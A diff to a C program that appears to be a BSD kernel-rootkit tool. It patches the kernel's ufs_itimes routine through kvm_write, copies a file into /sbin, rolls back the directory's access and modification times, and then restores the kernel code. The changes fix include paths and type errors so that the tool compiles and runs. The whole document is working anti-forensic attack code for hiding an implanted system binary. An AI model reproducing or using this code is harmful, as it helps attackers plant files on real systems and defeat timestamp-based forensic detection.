@@ -1,14 +1,13 @@
-#include <sys/errno.h>
-#include <sys/fcntl.h>
-#include <//usr/include/nlist.h>
-#include <//usr/include/kvm.h>
-#include <//usr/include/limits.h>
-#include <//usr/include/stdio.h>
-#include <//usr/include/stdlib.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <kvm.h>
+#include <nlist.h>
+#include <limits.h>
+#include <stdio.h>
+#include <stdlib.h>
 //#include <sys/libkern.h>
 //#include <sys/sysproto.h>
 #include <sys/time.h>
-#include <//usr/include/utime.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 //#include <sys/sysproto.h>
@@ -67,7 +66,7 @@ int main(int argc, char *argv[])
         exit(-1);
     }
     time[0].tv_sec = sb.st_atime;
-    time[1].tv_sec = sb.st_mtim;
+    time[1].tv_sec = sb.st_mtime;
 /* Patch ufs_itimes. */
     if (kvm_write(kd, nl[0].n_value + offset1, nop_code, sizeof(nop_code) - 1) < 0) {
         fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
@@ -79,10 +78,10 @@ int main(int argc, char *argv[])
     }
     /* Copy T_NAME into DESTINATION. */
     char string[] = "cp" " " T_NAME " " DESTINATION;
-    system(&string);
+    system(string);
 /* Roll back /sbin/'s access and modification times. */
-    if (utime("/sbin", (struct timeval *)&time) < 0) {
-// fprintf(stderr, "UTIMES ERROR: %d\n", errno);
+    if (utimes("/sbin", (struct timeval *)&time) < 0) {
+       fprintf(stderr, "UTIMES ERROR: %d\n", errno);
        exit(-1);
     }
 /* Restore ufs_itimes. */
